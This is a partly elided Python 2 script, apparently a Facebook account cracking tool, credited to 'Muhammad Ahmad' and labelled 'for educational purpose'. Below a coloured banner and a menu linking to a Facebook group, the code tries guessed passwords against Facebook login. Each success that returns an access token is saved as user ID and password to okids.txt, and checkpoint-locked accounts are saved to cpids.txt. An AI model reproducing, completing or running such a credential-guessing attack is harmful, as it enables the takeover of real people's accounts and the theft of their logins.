#Script Given By Muhammad Ahmad
#Script Is Given For Educational Purpose
#Script Edited By @MuhammadAhmad
#Utf-8 python 
...
\n\033[0m----------------------------------
\033[1;92mAuthor \033[1;93m: Muhammad Ahmad
\033[1;92mFb \033[1;93m: AhmadAli
...
def main():
    ...
    print ' \033[0m[2].\x1b[1;96m join our Facebook group'
    print ' \033[0m[3].\x1b[1;96m Contact on whattapp '
...
def log_sel():
    ...
    if select == '1':
        ...
        os.system('xdg-open https://www.facebook.com/groups/503350648011005/?ref=share)
        main()
    elif select == '0':
        os.system('exit')
    elif select == '3':
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                if 'access_token' in q:
                    ...
                    q = json.loads(data)
                    if 'access_token' in q:
                        print '\x1b[1;32m[Ahmad-OK]\033[0m ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('okids.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;31m[Ahmad-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m' #Thanks TechQaiser.& Also SyedZada Bro
                        cp = open('cpids.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
